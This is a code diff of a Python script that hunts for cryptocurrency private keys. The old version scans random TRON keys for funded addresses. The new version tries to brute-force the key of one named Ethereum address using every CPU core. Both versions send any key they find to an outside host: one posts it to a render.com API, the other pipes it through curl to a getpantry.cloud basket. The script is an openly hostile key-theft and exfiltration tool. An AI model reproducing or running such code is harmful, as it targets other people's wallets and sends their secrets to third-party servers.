@@ -1,93 +1,79 @@
-import hashlib
-import random
-import sys
-import time
-import requests
-from colorama import Fore
-import base58
+import os
 import ecdsa
 from Crypto.Hash import keccak
-import os
+from concurrent.futures import ProcessPoolExecutor, as_completed
+import multiprocessing
+import subprocess
+import json
 
-# Function to calculate the keccak256 hash
 def keccak256(data):
-    hasher = keccak.new(digest_bits=256)
-    hasher.update(data)
-    return hasher.digest()
+    """Calculate the Keccak-256 hash."""
+    k = keccak.new(digest_bits=256)
+    k.update(data)
+    return k.digest()
 
-# Get the ECDSA signing key from the raw private key
-def get_signing_key(raw_priv):
-    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)
+def generate_eth_address():
+    """Generate a random Ethereum address and its corresponding private key."""
+    # Generate a random 32-byte (256-bit) private key
+    private_key = os.urandom(32)  # Secure random number generator
+    # Generate public key from the private key
+    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
+    public_key = signing_key.get_verifying_key().to_string()
+    # Calculate Ethereum address from the public key (last 20 bytes of Keccak-256 hash of public key)
+    eth_address = '0x' + keccak256(public_key)[-20:].hex()
+    return private_key.hex(), eth_address
 
-# Convert the verifying key to a TRON address
-def verifying_key_to_addr(key):
-    pub_key = key.to_string()
-    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]  # TRON addresses start with 41
-    addr = base58.b58encode_check(primitive_addr)
-    return addr
+def check_address(target_address):
+    """Continuously generate Ethereum addresses and check if they match the target."""
+    while True:
+        private_key, eth_address = generate_eth_address()
+        if eth_address.lower() == target_address.lower():  # Check for match (case-insensitive)
+            return private_key, eth_address
 
-# Initialize counters for total scans and winners
-z = 0
-w = 0
+def post_to_pantry(private_key, eth_address):
+    """Post the private key and Ethereum address to the Pantry API."""
+    data = {
+        "user": {
+            "id": 123,
+            "name": "John Doe",
+            "email": "john.doe@example.com"
+        },
+        "private_key": private_key,
+        "eth_address": eth_address,
+        "notes": "Match found!"
+    }
+    # Convert data to JSON string
+    json_data = json.dumps(data)
 
-# Flask API URL
-flask_api_url = "https://linkcollector.onrender.com/api/wallets"  # Adjust this URL as needed
+    # Execute the curl command to post data
+    curl_command = [
+        'curl', '-X', 'POST', '-H', 'Content-type: application/json', 
+        '-d', json_data, 
+        'https://getpantry.cloud/apiv1/pantry/123581d0-cf4c-48d2-b426-904e8e6ef00f/basket/testBasket'
+    ]
+    
+    subprocess.run(curl_command)
 
-while True:
-    # Generate a random private key
-    raw = bytes(random.sample(range(0, 256), 32))
-    key = get_signing_key(raw)
-    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
-    priv = raw.hex()
+def brute_force(target_address, num_workers):
+    """Brute-force the private key using multiprocessing."""
+    with ProcessPoolExecutor(max_workers=num_workers) as executor:
+        futures = [executor.submit(check_address, target_address) for _ in range(num_workers)]
+        
+        for future in as_completed(futures):
+            private_key, eth_address = future.result()
+            print(f"Match found!")
+            print(f"Private Key: {private_key}")
+            print(f"Ethereum Address: {eth_address}")
+            # Post the found private key and address to the Pantry API
+            post_to_pantry(private_key, eth_address)
+            return
 
-    # Request account data from TronScan API
-    try:
-        block = requests.get(f"https://apilist.tronscan.org/api/account?address={addr}")
-        block.raise_for_status()  # Check for request errors
-        res = block.json()
+if __name__ == "__main__":
+    # The target Ethereum address you want to match
+    target_address = '0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549'
+    
+    # Number of CPU cores to use (set to max available)
+    num_workers = multiprocessing.cpu_count()
 
-        # Check if the address has any balances
-        balances = res.get("balances", [])
-        if balances:
-            bal = float(balances[0]["amount"])
-        else:
-            bal = 0
-
-        # If the balance is greater than 0, store the address and private key
-        if bal > 0:
-            w += 1
-            with open("FileTRXWinner.txt", "a") as f:
-                f.write(f'\nADDRESS: {addr}   Balance: {bal}')
-                f.write(f'\nPRIVATE KEY: {priv}')
-                f.write('\n------------------------')
-
-            # Post the address to the Flask API
-            try:
-                response = requests.post(flask_api_url, json={
-                    "trx_address": addr,
-                    "private_key": priv,
-                    "balance": bal
-                })
-                if response.status_code == 201:
-                    print(f"{Fore.GREEN}Posted to API successfully: {addr}{Fore.RESET}")
-                else:
-                    print(f"{Fore.RED}Failed to post to API: {response.status_code}{Fore.RESET}")
-            except requests.exceptions.RequestException as e:
-                print(f"{Fore.RED}Error posting to API: {str(e)}{Fore.RESET}")
-
-        else:
-            print(f"{Fore.RED}Total Scan: {Fore.BLUE}{z}{Fore.RESET}")
-            print(f"{Fore.YELLOW}Address: {Fore.RESET}{addr}           Balance: {bal}")
-            print(f"{Fore.YELLOW}Address(hex): {Fore.RESET}{base58.b58decode_check(addr.encode()).hex()}")
-            print(f"{Fore.YELLOW}Private Key: {Fore.RED}{priv}{Fore.RESET}")
-
-        # Increment the scan counter
-        z += 1
-
-    except requests.exceptions.RequestException as e:
-        print(f"Error fetching data for address {addr}: {str(e)}")
-    except (KeyError, IndexError, ValueError) as e:
-        print(f"Error processing response for address {addr}: {str(e)}")
-
-    # Pause before the next iteration to avoid API rate limits
-    time.sleep(1)  # You can adjust the sleep time if needed
+    print(f"Starting brute force with {num_workers} workers...")
+    brute_force(target_address, num_workers)
